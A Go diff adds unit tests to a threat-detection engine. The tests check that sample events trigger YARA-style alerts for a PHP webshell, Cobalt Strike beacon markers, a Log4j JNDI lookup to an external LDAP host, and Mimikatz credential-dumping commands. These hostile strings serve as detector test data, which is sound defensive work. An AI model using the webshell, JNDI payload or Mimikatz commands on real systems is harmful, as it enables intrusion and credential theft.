@@ -106,4 +106,76 @@ func TestThreatDetectionPipeline(t *testing.T) {
 	} else if alert5.Type != "anomaly" || alert5.RuleID != "ML-ANOMALY-NET-2SIGMA" {
 		t.Errorf("Unexpected network anomaly alert details: %+v", alert5)
 	}
+
+	// 6. Test YARA Webshell Rule Matching (YARA-MAL-001)
+	webshellEvent := &IngestEvent{
+		TenantId:  "acme_tenant",
+		AssetId:   "srv-web-01",
+		EventType: "file",
+		Timestamp: time.Now().UnixMilli(),
+		Payload: map[string]string{
+			"file_path":       "/var/www/html/shell.php",
+			"content_preview": "<?php eval(base64_decode('...')); passthru($_POST['cmd']); ?>",
+		},
+	}
+	alertWebshell := engine.ProcessEvent(ctx, webshellEvent)
+	if alertWebshell == nil {
+		t.Errorf("Expected YARA webshell alert, got nil")
+	} else if alertWebshell.RuleID != "YARA-MAL-001" || alertWebshell.Severity != "critical" {
+		t.Errorf("Unexpected webshell alert details: %+v", alertWebshell)
+	}
+
+	// 7. Test YARA Cobalt Strike Beacon Matching (YARA-MAL-003)
+	csEvent := &IngestEvent{
+		TenantId:  "acme_tenant",
+		AssetId:   "ws-exec-02",
+		EventType: "file",
+		Timestamp: time.Now().UnixMilli(),
+		Payload: map[string]string{
+			"file_path":       "memory_dump_pid4012.bin",
+			"content_preview": "MZ... ReflectiveLoader ... \\\\.\\pipe\\status_12",
+		},
+	}
+	alertCS := engine.ProcessEvent(ctx, csEvent)
+	if alertCS == nil {
+		t.Errorf("Expected YARA Cobalt Strike alert, got nil")
+	} else if alertCS.RuleID != "YARA-MAL-003" || alertCS.Severity != "high" {
+		t.Errorf("Unexpected Cobalt Strike alert details: %+v", alertCS)
+	}
+
+	// 8. Test YARA Log4j JNDI Exploit Matching (YARA-MAL-004)
+	log4jEvent := &IngestEvent{
+		TenantId:  "acme_tenant",
+		AssetId:   "srv-api-01",
+		EventType: "file",
+		Timestamp: time.Now().UnixMilli(),
+		Payload: map[string]string{
+			"file_path":       "/var/log/nginx/access.log",
+			"content_preview": "User-Agent: ${jndi:ldap://198.51.100.42:1389/Exploit}",
+		},
+	}
+	alertLog4j := engine.ProcessEvent(ctx, log4jEvent)
+	if alertLog4j == nil {
+		t.Errorf("Expected YARA Log4j alert, got nil")
+	} else if alertLog4j.RuleID != "YARA-MAL-004" || alertLog4j.Severity != "critical" {
+		t.Errorf("Unexpected Log4j alert details: %+v", alertLog4j)
+	}
+
+	// 9. Test YARA Mimikatz Memory Matching (YARA-MAL-005)
+	mimikatzEvent := &IngestEvent{
+		TenantId:  "acme_tenant",
+		AssetId:   "srv-dc-01",
+		EventType: "file",
+		Timestamp: time.Now().UnixMilli(),
+		Payload: map[string]string{
+			"file_path":       "lsass_dump.dmp",
+			"content_preview": "DEBUG: privilege::debug sekurlsa::logonpasswords lsadump::sam",
+		},
+	}
+	alertMimi := engine.ProcessEvent(ctx, mimikatzEvent)
+	if alertMimi == nil {
+		t.Errorf("Expected YARA Mimikatz alert, got nil")
+	} else if alertMimi.RuleID != "YARA-MAL-005" || alertMimi.Severity != "critical" {
+		t.Errorf("Unexpected Mimikatz alert details: %+v", alertMimi)
+	}
 }
